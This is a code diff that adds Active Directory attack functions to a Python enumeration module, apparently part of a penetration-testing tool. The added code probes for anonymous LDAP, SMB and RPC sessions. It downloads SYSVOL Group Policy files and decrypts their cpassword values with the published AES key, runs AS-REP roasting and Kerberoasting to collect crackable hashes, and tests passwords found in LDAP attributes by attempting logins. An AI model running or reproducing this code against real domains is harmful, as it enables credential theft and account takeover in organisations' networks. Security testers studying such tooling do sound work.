@@ -2,14 +2,25 @@
 
 import json
 import ldap3
-from ldap3.core.exceptions import LDAPBindError
+import re
+import base64
+import os
+import socket
+import concurrent.futures
+from ldap3.core.exceptions import LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError
+from impacket.dcerpc.v5 import epm
+from impacket.smbconnection import SessionError
+from impacket.nmb import NetBIOSTimeout, NetBIOSError
+from termcolor import colored
+from Cryptodome.Cipher import AES
 
 from . .connectors.connectors import Connectors
+from . .utils.utils import Utils
 
 class ModEnumerator():
 
     def __init__(self):
-        pass
+        self.utils = Utils()
 
 
     def enumerate_server_names(self, computerobjects: ldap3.Entry) -> dict:
@@ -97,3 +108,284 @@ class ModEnumerator():
                         passwords[user['attributes']['name'][0]] = user['attributes'].get('userPassword')
 
         return passwords
+
+
+    def enumNULLSessions(self, server: str, connector: Connectors):
+        # Test for anonymous binds to ldap
+        try:
+            ldap = connector.ldap_connector(server, False, '', '')
+            print('[ ' + colored('WARN', 'yellow') +' ] Anonymous LDAP bind allowed')
+        except LDAPBindError:
+            print('[ ' + colored('INFO', 'green') +' ] Anonymous LDAP bind not allowed')
+        ldap.unbind()
+
+        # Test for null-session/anonymous session on smb
+        smb = connector.smb_connector(server, '', '')
+        if smb:
+            # It is not False and as such, we got a connection back
+            print('[ ' + colored('WARN', 'yellow') + f' ] Anonymous/NULL SMB connection allowed got ServerOS: {smb.getServerOS()} and HostName: {str(smb.getServerName())}')
+        else:
+            print('[ ' + colored('INFO', 'green') +' ] Anonymous/NULL SMB connection not allowed')
+        smb.logoff()
+
+        # Test for null-session/anonymous session on rpc
+        rpc = connector.rpc_connector(server, '', '')
+        resp = rpc.bind(epm.MSRPC_UUID_PORTMAP)
+        # TODO: Validate by negative test
+        if resp.getData():
+            print('[ ' + colored('WARN', 'yellow') + f' ] Anonymous/NULL RPC connection allowed got following bytes: {resp.getData()} from the connection')
+        else:
+            print('[ ' + colored('INFO', 'green') +' ] Anonymous/NULL RPC connection not allowed')
+
+
+    def enumSYSVOL(self, server: str, connector: Connectors, domuser: str, passwd: str) -> dict:
+        print('[ .. ] Searching SYSVOL for cpasswords\r')
+        cpasswords = {}
+        try:
+            smbconn = connector.smb_connector(server, domuser, passwd)
+            dirs = smbconn.listShares()
+            for share in dirs:
+                if str(share['shi1_netname']).rstrip('\0').lower() == 'sysvol':
+                    path = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
+                    paths = [e.get_shortname() for e in path if len(e.get_shortname()) > 2]
+                    for dirname in paths:
+                        try:
+                            # Dont want . or ..
+                            subPath = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), str(dirname) + '\\*')
+                            for sub in subPath:
+                                if len(sub.get_shortname()) > 2:
+                                    paths.append(dirname + '\\' + sub.get_shortname())
+                        except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
+                            continue
+                
+                    # Compile regexes for username and passwords
+                    cpassRE = re.compile(r'cpassword=\"([a-zA-Z0-9/]+)\"')
+                    unameRE = re.compile(r'userName|runAs=\"([ a-zA-Z0-9/\(\)-]+)\"')
+
+                    # Prepare the ciphers based on MSDN article with key and IV
+                    cipher = AES.new(bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'), AES.MODE_CBC, bytes.fromhex('00' * 16))
+                
+                    # Since the first entry is the DC we dont want that
+                    for item in paths[1:]:
+                        if '.xml' in item.split('\\')[-1]:
+                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'wb') as f:
+                                smbconn.getFile(str(share['shi1_netname']).rstrip('\0'), item, f.write)             
+                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'r') as f:
+                                try:
+                                    fileContent = f.read()
+                                    passwdMatch = cpassRE.findall(str(fileContent))
+                                    for passwd in passwdMatch:
+                                        unameMatch = unameRE.findall(str(fileContent))
+                                        for usr in unameMatch:
+                                            padding = '=' * (4 - len(passwd) % 4) 
+                                            # For some reason, trailing nul bytes were on each character, so we remove any if they are there
+                                            cpasswords[usr] = cipher.decrypt(base64.b64decode(bytes(passwd + padding, 'utf-8'))).strip().decode('utf-8').replace('\x00', '')
+                                except (UnicodeDecodeError, AttributeError) as e:
+                                    # Remove the files we had to write during the search
+                                    os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))
+                                    continue
+
+                            # Remove the files we had to write during the search
+                            os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))
+
+        except (SessionError, UnicodeEncodeError, NetBIOSError):
+            print('[ ' + colored('ERROR', 'red') + ' ] Some error occoured while searching SYSVOL')
+        else:
+            smbconn.close()
+            return cpasswords
+
+
+    def enumSMB(self, connector: Connectors, smbShareCandidates: list, server: str, domuser: str, passwd: str) -> dict:
+        self.connector = connector
+        self.server = server
+        self.domuser = domuser
+        self.passwd = passwd
+        smbBrowseable = {}
+        try:
+            with concurrent.futures.ThreadPoolExecutor(max_workers=len(smbShareCandidates)) as executor:
+                worker = executor.map(self.enumShare, [share for share in smbShareCandidates])
+                for result in worker:
+                    smbBrowseable = { **smbBrowseable, **result }
+        except ValueError:
+            pass
+        return smbBrowseable
+
+
+    def enumShare(self, dnsname):
+        smbBrowseable = {}
+        try:
+            # Changing default timeout as shares should respond withing 5 seconds if there is a share
+            # and ACLs make it available to self.user with self.passwd
+            smbconn = self.connector.smb_connector(self.server, self.domuser, self.passwd)
+            dirs = smbconn.listShares()
+            smbBrowseable[str(dnsname)] = {}
+            for share in dirs:
+                smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = ''
+                try:
+                    _ = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
+                    smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = True
+                except (SessionError, UnicodeEncodeError, NetBIOSError):
+                    # Didnt have permission, all good
+                    # Im second guessing the below adding to the JSON file as we're only interested in the listable directories really
+                    #self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = False
+                    continue
+            smbconn.logoff()
+        except (socket.error, NetBIOSTimeout, SessionError, NetBIOSError):
+            # TODO: Examine why we sometimes get:
+            # impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_NOT_AVAILABLE
+            # on healthy shares. It seems to be reported with CIF shares 
+            return smbBrowseable
+        return smbBrowseable
+
+
+    def enumASREPRoast(self, conn: ldap3.Connection, server: str, dc_string) -> list:
+        from . .attacks.asreproast import asreproast
+        roaster = asreproast.AsRepRoast()
+        # Build user array
+        users = []
+        conn.search(dc_string, '(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', attributes='*', search_scope=ldap3.SUBTREE)
+        for entry in conn.entries:
+            users.append(str(entry['sAMAccountName']) + '@{0}'.format(server))
+        if len(users) == 0:
+            print('[ ' + colored('OK', 'green') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
+        elif len(users) == 1:
+            print('[ ' + colored('OK', 'yellow') +' ] Found {0} account that does not require Kerberos preauthentication'.format(len(users)))
+        else:
+            print('[ ' + colored('OK', 'yellow') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
+    
+        hashes = []
+        # Build request for Tickets
+        for usr in users:
+            userHash = roaster.RepRoast(server, usr)
+            if userHash:
+                hashes = hashes + userHash
+        
+        return hashes
+
+
+    def enumKerberoast(self, spn: list, domuser: str, passwd: str) -> dict:
+        from . .attacks.kerberoast import kerberoast
+        kerberoaster = kerberoast.Kerberoast()
+
+        users_spn = {}
+        user_tickets = {}
+
+        userDomain = domuser.split('@')[1]
+
+        idx = 0
+        for _ in spn:
+            spns = json.loads(spn[idx].entry_to_json())
+            users_spn[self.utils.splitJsonArr(spns['attributes'].get('name'))] = self.utils.splitJsonArr(spns['attributes'].get('servicePrincipalName')) 
+            idx += 1    
+        for user, spn in users_spn.items():
+            if isinstance(spn, list):
+                # We only really need one to get a ticket
+                spn = spn[0]
+            else:
+                tickets = kerberoaster.roast(domuser, passwd, userDomain, user, spn)
+                if tickets:
+                    user_tickets = { **user_tickets, **tickets }
+
+        return user_tickets
+
+
+    def enumForCreds(self, CREDS: bool, passwords: dict, ldapdump: list, connector: Connectors, server: str) -> bool:
+        searchTerms = [
+                'legacy', 'pass', 'password', 'pwd', 'passcode'
+        ]
+        excludeTerms = [
+                'badPasswordTime', 'badPwdCount', 'pwdLastSet', 'legacyExchangeDN'
+        ]
+        possiblePass = {}
+        idx = 0
+        for _ in ldapdump:
+            user = json.loads(ldapdump[idx].entry_to_json())
+            for prop, value in user['attributes'].items():
+                if any(term in prop.lower() for term in searchTerms) and not any(ex in prop for ex in excludeTerms):
+                    try:
+                        possiblePass[user['attributes']['userPrincipalName'][0]] = value[0]
+                    except KeyError:
+                        # Could be a service user instead
+                        try:
+                            possiblePass[user['attributes']['servicePrincipalName'][0]] = value[0]
+                        except KeyError:
+                            # Don't know which type
+                            continue
+
+            idx += 1
+        if len(possiblePass) > 0:
+            print('[ ' + colored('INFO', 'green') +' ] Found possible password in properties - attempting to determine if it is a password')
+
+            for user, password in possiblePass.items():
+                try:
+                    usr, passwd = self.entroPass(user, password, server, CREDS, connector)
+                except TypeError:
+                    # None returned, just continue
+                    continue
+            if not CREDS:
+                domuser = usr
+                passwd = passwd
+                passwords[domuser] = passwd
+                return True, passwords
+        return False, passwords
+
+
+    def entroPass(self, user: str, password: str, server: str, CREDS: bool, connector: Connectors):
+        test_conn = None
+        if not password:
+            return None
+        # First check if it is a clear text
+        try:
+            test_conn = connector.ldap_connector(server, True, user, password)
+        except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
+            try:
+                test_conn = connector.ldap_connector(server, False, user, password)
+            except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
+                pass
+        if test_conn:
+            # Validate the login (bind) request
+            if int(test_conn.result['result']) != 0:
+                if CREDS:
+                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" with: "{1}" as possible clear text password'.format(user, password))
+                else:
+                    print('[ ' + colored('INFO', 'green') +' ] User: "{0}" with: "{1}" was not cleartext'.format(user, password))
+            else:
+                if CREDS:
+                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" had cleartext password of: "{1}" in a property'.format(user, password))
+                else:
+                    print('[ ' + colored('OK', 'yellow') +' ] User: "{0}" had cleartext password of: "{1}" in a property - continuing with these creds'.format(user, password))
+                    print('')
+                    return user, password
+            test_conn.unbind()
+            test_conn = None
+
+        # Attempt for base64
+        # Could be base64, lets try
+        try:
+            pw = base64.b64decode(bytes(password, encoding='utf-8')).decode('utf-8')
+        except base64.binascii.Error:
+            return None
+    
+        # Attempt decoded PW
+        try:
+            test_conn = connector.ldap_connector(server, True, user, pw)
+        except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
+            try:
+                test_conn = connector.ldap_connector(server, False, user, pw)
+            except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
+                pass
+        if test_conn:
+            # Validate the login (bind) request
+            if int(test_conn.result['result']) != 0:
+                test_conn.unbind()
+                if CREDS:
+                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" with: "{1}" as possible base64 decoded password'.format(user, pw))
+                else:
+                    print('[ ' + colored('INFO', 'green') +' ] User: "{0}" with: "{1}" was not base64 encoded'.format(user, pw))
+            else:
+                if CREDS:
+                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" had base64 encoded password of: "{1}" in a property'.format(user, pw))
+                else:
+                    print('[ ' + colored('OK', 'yellow') +' ] User: "{0}" had base64 encoded password of: "{1}" in a property - continuing with these creds'.format(user, pw))
+                    print('')
+                    return user, pw
